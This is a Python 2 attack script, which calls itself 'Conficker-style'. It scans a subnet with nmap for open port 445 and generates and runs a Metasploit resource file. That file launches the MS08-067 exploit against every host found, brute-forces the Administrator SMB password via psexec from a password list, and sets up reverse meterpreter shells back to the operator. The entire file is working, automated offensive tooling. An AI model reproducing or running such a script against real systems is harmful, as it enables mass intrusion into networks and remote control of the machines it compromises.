#!/usr/bin/env python2
import nmap, argparse, os, sys

def acquire_targets_t(subnet, port):
    nm = nmap.PortScanner()
    nm.scan(subnet, str(port))
    tH = []
    for h in nm.all_hosts():
        if nm[h].has_tcp(int(port)):
            state = nm[h]['tcp'][int(port)]['state']
            if state == 'open':
                print("[+] Found target: %s:%s" % (h, str(port)))
                tH.append(h)
    return tH


def handler(cfg, lh, lp):
    cfg.write('use exploit/multi/handler\n')
    cfg.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    cfg.write('set LHOST ' +lh+ '\n')
    cfg.write('set LPORT ' +str(lp)+ '\n')
    cfg.write('exploit -j -z\n')
    cfg.write("setg DisablePayloadHandler 1\n")


def ms08_067_netapi(cfg, rh, lh, lp):
    cfg.write("use exploit/windows/smb/ms08_067_netapi\n")
    cfg.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    cfg.write("set EXITFUNC thread\n")
    cfg.write("set RHOST " +rh+ "\n")
    cfg.write('set LHOST ' +lh+ '\n')
    cfg.write('set LPORT ' +str(lp)+ '\n')
    cfg.write('exploit -j -z\n')


def smb_brute(cfg, rh, lh, lp, pf):
    u = "Administrator"
    pF = open(pf, 'r')
    for p in pF:
        pw = p.strip("\n").strip("\r")
        cfg.write("use exploit/windows/smb/psexec\n")
        cfg.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        cfg.write("set EXITFUNC thread\n")
        cfg.write("set SMBUser " +u+ "\n")
        cfg.write("set SMBPass " +pw+ "\n")
        cfg.write("set RHOST " +rh+ "\n")
        cfg.write('set LHOST ' +lh+ '\n')
        cfg.write('set LPORT ' +str(lp)+ '\n')
        cfg.write('exploit -j -z\n')


def getargs():
    ap = argparse.ArgumentParser(description="Conficker-style attack; ms08_067_netapi rshell and SMB brute")
    ap.add_argument('-s', '--subnet', type=str, default=None, help="subnet, range, or list of IPs in CSV")
    ap.add_argument('-lh', '--localhost', type=str, default=None, help="set LHOST -")
    ap.add_argument('-lp', '--localport', type=str, default=None, help="set LPORT -")
    ap.add_argument('-pf', '--passfile', type=str, default=None, help="set SMBPass -")
    args, l = ap.parse_known_args()
    if (args.subnet == None or args.localhost == None or args.localport == None):
        ap.print_help()
        sys.exit()
    else:
        return args.subnet, args.localhost, args.localport, args.passfile


def main():
    subn, lh, lp, pf = getargs()
    rp = 445
    targets = acquire_targets_t(subn, rp)
    cfg = open("/tmp/meta.rc", 'w')
    handler(cfg, lh, lp)
    for rh in targets:
        ms08_067_netapi(cfg, rh, lh, lp)
        if not pf == None:
            smb_brute(cfg, rh, lh, lp, pf)
    cfg.close()
    os.system("msfconsole -r /tmp/meta.rc")


if __name__=="__main__":
    main()    

